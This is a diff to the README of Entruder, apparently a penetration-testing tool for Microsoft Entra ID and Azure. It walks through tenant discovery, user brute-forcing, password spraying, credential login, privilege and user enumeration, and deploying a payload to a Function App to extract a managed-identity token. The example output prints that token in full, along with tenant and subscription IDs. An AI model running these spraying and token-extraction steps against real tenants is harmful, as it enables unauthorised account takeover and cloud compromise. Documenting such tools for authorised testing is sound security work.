@@ -313,21 +313,22 @@ entruder login ropc -t <TENANT_ID> -c azurecli
   </tr>
 </table>
 
-### Get a Tenant ID from a domain
+### Basic Engagement via Entruder
+#### Get a Tenant ID from a domain
 The testing flow generally begins by enumerating the Tenant ID from their domain name, this can be done in Entruder through:
 ```bash
 entruder get tenant -d <DOMAIN_NAME>
 ```
 <img width="1034" height="287" alt="image" src="https://github.com/user-attachments/assets/e3a4451c-d7fe-43b1-a82a-06f9e50cf972" />
 
-### Discovering valid users via a wordlist
+#### Discovering valid users via a wordlist
 After getting the tenant we can use the brute module with a predefined wordlist to discover valid users
 ```bash
 entruder brute users -d <DOMAIN_NAME> -l <PATH_TO_WORDLIST>
 ```
 <img width="804" height="199" alt="image" src="https://github.com/user-attachments/assets/ade197d4-f735-495c-8f8f-5a44ed0dcdcf" />
 
-### Password Spraying
+#### Password Spraying
 After discovering valid users we can spray a password list across them using brute pwspray
 ```bash
 entruder brute pwspray -u <USER_LIST> --passwords <PASSWORD_LIST> -t <TENANT_ID> -c <CLIENT_ID>
@@ -335,38 +336,172 @@ entruder brute pwspray -u <USER_LIST> --passwords <PASSWORD_LIST> -t <TENANT_ID>
 In the below example we can see that a valid password is discovered, with no MFA enforcement.
 <img width="1646" height="177" alt="image" src="https://github.com/user-attachments/assets/edc56517-f1bd-4599-81a0-842f49fa5816" />
 
-### Login
+#### Login
 Now with a set of valid credentials we can authenticate to relevant resource planes and retrieve an access token for each, they will be stored in a session file in `/home/<USER>/.entruder/sessions/`
 ```bash
 entruder login ropc -t <CLIENT_ID> -c <CLIENT_ID> -u '<UPN>' -p '<PASSWORD>'
 ```
 <img width="1861" height="223" alt="image" src="https://github.com/user-attachments/assets/94d4c606-ab70-46f6-8bdc-3d647cdab2de" />
 
-### Tenant Enumeration
+#### Tenant Enumeration
 We can begin enumeration by getting a list of subscriptions, an example below shows a single subscription with its respective id, which will be used as an argument in further commands
 ```bash
 entruder enum subscriptions
 ```
 <img width="777" height="525" alt="image" src="https://github.com/user-attachments/assets/c8188a1c-f7a7-46e6-a78c-eae725615d6c" />
 
-### Privilege Enumeration
+#### Privilege Enumeration
 We can enumerate the user's tenant-wide privileges including their group memberships, directory roles and owned objects with Entruder
 ```bash
 entruder enum privs -s <SUBSCRIPTION_ID>
 ```
 <img width="2044" height="398" alt="image" src="https://github.com/user-attachments/assets/ad061c3b-e4bd-499a-874c-dfe871d83142" />
-The output shows that our user possesses the `Global Administrator` role which means they possess the highest privileges inside the tenant.
+The output shows that our user possesses the "Global Administrator" role which means they possess the highest privileges inside the tenant.
+
+### User Enumeration
+Entruder can be used to enumerate all users in the tenant
+```bash
+entruder enum users
+```
+<img width="1018" height="373" alt="image" src="https://github.com/user-attachments/assets/b7f831c8-19da-4b75-b296-c3b5e1e65f56" />
+
+### Compute Exploitation
+Entruder can be used to abuse compute resources via "Contributor" role assigned users to execute code and extract managed identity tokens, an example of this would be Function Apps.
+```bash
+$ entruder exploit funcapp \
+  -t 7a930b37-b80e-4c65-a674-9bffa7b7a42a \
+  -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46 \
+  -s 3e8cfe1d-4e52-4beb-8679-4eda267cc128 \
+  -rg bacho_group  -f bacho -i -r graph \
+  -H bacho-bngzcya8arafeubv.canadacentral-01.azurewebsites.net
+
+[+] SCM basic auth enabled
+https://bacho-bngzcya8arafeubv.scm.canadacentral-01.azurewebsites.net
+[*] Deploying python payload to bacho...
+202
+"c61b62c4-f339-4074-9857-46b08272341b"
+[+] Payload deployed successfully
+[*] Waiting for function to initialise...
+[*] Invoking function...
+[+] Output:
+{"access_token": 
+"eyJ0eXAiOiJKV1QiLCJub25jZSI6Ikh4cmJzQnQ3aWgycE1WMDU2N0s3cnRqMkJTNS11YTN6TU15aE1URnd3eTQiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQ1aDQwcTdHMHg0OXFuNDFsTTkta0tqcEQ5OCIsImtpZCI6IlQ1aDQwcTdHMHg0OXFuNDFsTTkta0tqcEQ5OCJ9.e
+yJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvN2E5MzBiMzctYjgwZS00YzY1LWE2NzQtOWJmZmE3YjdhNDJhLyIsImlhdCI6MTc4ODExNzY2NSwibmJmIjoxNzg4MTE3NjY1LCJleHAiOjE3ODgyMDQz
+NjUsImFjcnMiOlsicGZkciJdLCJhaW8iOiJBU1FBMi84Y0FBQUFLYm0wdFFkWlQ1SkxTSUhZdCtCRjZlMENPNXRRSmZaMzdhNEt3aUVrbFBjPSIsImFwcF9kaXNwbGF5bmFtZSI6ImJhY2hvIiwiYXBwaWQiOiI5NTk2YTIwYi1mOTk3LTRhMWYtOTllYS1jMDQ1ZTBlZjZkNzE
+iLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC83YTkzMGIzNy1iODBlLTRjNjUtYTY3NC05YmZmYTdiN2E0MmEvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiJkMWI3MTVlZS0wOGUyLTRlNjEtYjY4Yi02NjFkODBiZTcxYjgiLCJyaCI6IjEuQV
+hvQU53dVRlZzY0WlV5bWRKdl9wN2VrS2dNQUFBQUFBQUFBd0FBQUFBQUFBQUFBQUFCNkFBLiIsInN1YiI6ImQxYjcxNWVlLTA4ZTItNGU2MS1iNjhiLTY2MWQ4MGJlNzFiOCIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjdhOTMwYjM3LWI4MGUtNGM2NS1hN
+jc0LTliZmZhN2I3YTQyYSIsInV0aSI6ImJSdnBLTFZBcGtlRENkbGF4NnV6QUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjA5OTdhMWQwLTBkMWQtNGFjYi1iNDA4LWQ1Y2E3MzEyMWU5MCJdLCJ4bXNfYWN0X2ZjdCI6IjkgMyIsInhtc19mdGQiOiJrcTNfUkF1cnNxUDlxV0Rs
+X2pxZUxvNUlzRzlyS2pFbHNvb3FPNkxkOEc0QlkyRnVZV1JoWTJWdWRISmhiQzFrYzIxeiIsInhtc19pZHJlbCI6IjcgOCIsInhtc19wZnRleHAiOiIxNzg4MjkwNzY1IiwieG1zX3JkIjoiMC40MkxsWUJKaXJCSVM0ZUFVRXBnV0h2aDgyLW1wUGszUFhDemJ4SUxZaEVRNE9
+JUUVtQmtnNEFDVUZoTGg0QllTNE5qUXZINExYX2pTaU9PSzFpNnR6YklBIiwieG1zX3N1Yl9mY3QiOiIzIDkiLCJ4bXNfdGNkdCI6IjE3ODgwMzAxNDMiLCJ4bXNfdG50X2ZjdCI6IjMgMiJ9.XQnKiR2Eh07SnQvEykRysEsJNUBY3tZ-rhvWKfA2Op2yQjCuCN2RdrYY1vvbu
+6sEY0BST5Ama1WLOIIORS-xjayuboiQugqVWE1GcaxinkoiaDYoLlpcmwQBO42ps4tK39yuHpIpx-qKq_cz1dE-l7aQIT-qV6aB6a3REiqvoljLkTX8xA_ZzWq_lZ6Kd20268Obn8iAnNmTHsOu2-OcgbfNLOwOVZ4mqugCnJ5_feFsuVfz6jgCav-G_ZoYTp3omQIgy3osAbwq
+BJ-ee7kTVXZLqAoFDeXShS5vYBo8nGDIQsdnukB8coAAd6TR5C9G9fuodcEoQgGs8n0V3_F8PA", "expires_on": "1788204364", "resource": "https://graph.microsoft.com/", "token_type": "Bearer", "client_id": 
+"9596a20b-f997-4a1f-99ea-c045e0ef6d71"}
+```
+## Installation
+You can clone the repository and use the tool via python3.10+
+```bash
+git clone https://github.com/LGenAgul/Entruder
+cd Entruder
+pip install -e .
+entruder --help
+```
+Or download a compiled binary from releases if you don't want Python.
+
+## Acknowledgements
+This tool was built upon techniques and research offered by the following 
+projects. Kudos to their creators for the outstanding work:
+- **[AADInternals](https://github.com/Gerenios/AADInternals)** by Dr. Nestori Syynimaa - the foundational reference 
+  for Entra ID attack techniques, particularly the Azure AD Connect 
+  hybrid attack chain and WS-Trust authentication flows
+- **[ROADtools](https://github.com/dirkjanm/ROADtools)** by Dirk-jan Mollema - architecture reference for 
+  Python-native Entra ID tooling and token handling
+- **[GraphRunner](https://github.com/dafthack/GraphRunner)** by Beau Bullock - reference for Microsoft Search 
+  API enumeration techniques and FOCI token abuse
+- **[Impacket](https://github.com/fortra/impacket)** by Fortra - DPAPI and MSSQL client implementation 
+  used in the azsync module
+- **[MicroBurst](https://github.com/NetSPI/MicroBurst)** by NetSPI - Azure resource enumeration techniques
+- **[PowerZure](https://github.com/hausec/PowerZure)** by hausec - Azure exploitation technique reference
+
+## Requirements
+All dependencies are installed automatically via `pip install -e .`
+
+| Package | Purpose |
+|---------|---------|
+| `httpx` | HTTP client for all API requests |
+| `typer` | CLI framework |
+| `rich` | Terminal output formatting |
+| `msal` | Microsoft Authentication Library (device flow, cert auth) |
+| `impacket` | DPAPI decryption and MSSQL client (azsync module) |
+| `cryptography` | Certificate-based authentication |
+| `jsonschema` | Session file validation |
+| `requests` | MSAL dependency |
+
+### Optional: Kerberos authentication
+
+The `login kerberos` command requires additional system packages:
+
+**Linux/macOS:**
+```bash
+# Debian/Ubuntu
+sudo apt install libkrb5-dev
+pip install gssapi
+
+# macOS
+brew install krb5
+pip install gssapi
+```
+
+**Windows:**
+```bash
+pip install winkerberos
+```
+
+### Pre-built binaries
+
+If you prefer not to manage Python dependencies, pre-built binaries for 
+Linux, macOS, and Windows are available in the 
+[releases](https://github.com/LGenAgul/Entruder/releases) page — 
+no Python installation required.
+
+## Contributing
+Contributions are welcome. If you have a technique, module, or a general improvement 
+you'd like to add, feel free to open a pull request or an issue.
+
+### Guidelines
+
+- Follow the existing module structure with each command living in its own file 
+  under the appropriate module folder
+- Use the `@handle_cli_errors` decorator on all commands
+- Add a `vprint` call before every HTTP request
+- Include a clear docstring on every command describing what it does and what token/permissions it requires
+- Test your changes against a live tenant before submitting
+
+### Adding a new module
+
+If you're adding an entirely new module group:
+
+1. Create a folder under `entruder/modules/<module_name>/`
+2. Add `__init__.py` exporting the Typer app
+3. Add `_shared.py` with the app definition and shared imports
+4. Register the app in `entruder/cli.py`
+
+### Reporting issues
+
+Open a GitHub issue with:
+- The command you ran (redact any sensitive values)
+- The error or unexpected output
+- Your Python version and OS
 
 [python-shield]: https://img.shields.io/badge/python-3.10+-blue.svg?style=for-the-badge
-[contributors-shield]: https://img.shields.io/github/contributors/github_username/repo_name.svg?style=for-the-badge
-[contributors-url]: https://github.com/github_username/repo_name/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/github_username/repo_name.svg?style=for-the-badge
-[forks-url]: https://github.com/github_username/repo_name/network/members
-[stars-shield]: https://img.shields.io/github/stars/github_username/repo_name.svg?style=for-the-badge
-[stars-url]: https://github.com/github_username/repo_name/stargazers
-[issues-shield]: https://img.shields.io/github/issues/github_username/repo_name.svg?style=for-the-badge
-[issues-url]: https://github.com/github_username/repo_name/issues
-[license-shield]: https://img.shields.io/github/license/github_username/repo_name.svg?style=for-the-badge
-[license-url]: https://github.com/github_username/repo_name/blob/master/LICENSE.txt
+[contributors-shield]: https://img.shields.io/github/contributors/LGenAgul/Entruder.svg?style=for-the-badge
+[contributors-url]: https://github.com/LGenAgul/Entruder/graphs/contributors
+[forks-shield]: https://img.shields.io/github/forks/LGenAgul/Entruder.svg?style=for-the-badge
+[forks-url]: https://github.com/LGenAgul/Entruder/network/members
+[stars-shield]: https://img.shields.io/github/stars/LGenAgul/Entruder.svg?style=for-the-badge
+[stars-url]: https://github.com/LGenAgul/Entruder/stargazers
+[issues-shield]: https://img.shields.io/github/issues/LGenAgul/Entruder.svg?style=for-the-badge
+[issues-url]: https://github.com/LGenAgul/Entruder/issues
+[license-shield]: https://img.shields.io/github/license/LGenAgul/Entruder.svg?style=for-the-badge
+[license-url]: https://github.com/LGenAgul/Entruder/blob/main/LICENSE
 [linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
-[linkedin-url]: https://linkedin.com/in/linkedin_username
+[linkedin-url]: https://www.linkedin.com/in/mate-agulashvili-968248183/
